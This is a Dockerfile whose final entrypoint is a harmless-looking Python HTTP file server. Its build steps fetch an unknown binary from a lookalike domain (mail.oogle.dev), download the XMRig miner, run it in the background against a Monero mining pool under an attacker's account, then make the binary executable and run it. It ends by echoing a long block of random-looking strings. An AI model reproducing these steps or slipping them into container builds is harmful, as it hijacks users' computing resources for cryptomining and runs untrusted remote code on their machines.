FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo 111qlSp6fzOmukEIYWwXBMvb78zZi5EJ i0E5XEkylQjMs1XeQBlx3E4V0ssGbUis GaTueFxF1Xr5O1U5YN44EwhnVeSIUcOk cnE9UtOEC2vVBmUJSlLVsJmItdXfdGmW TzHIepbvAdg1JXhJUEol4OuPGg8aRNKZ TQ1lsbbItKvn5SVKzmLN15ccHGplG3FU 7lIA1HZyfnewmibBRj1Wvu1BHfyDnKVZ TeqIuu64UpqQjUa1OtydvX7dAJjc1o0d ALQF5xLmC84XXSMpL0GZdzLqBnezgbwR xTXMoMfau9L7InPwkwyxLVbZktzLN86M kg2EzckYh7C6nguAsfYKYXx0aggm7HE4 NmTUu1flWlJyd5Tguk4AOozckDUOcAFf a097ssPkjVDKvLmvTuxCUmSsvz1tZdFz BAzJej1VsvwYeWDTiotETLbpXJZQJKVt DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]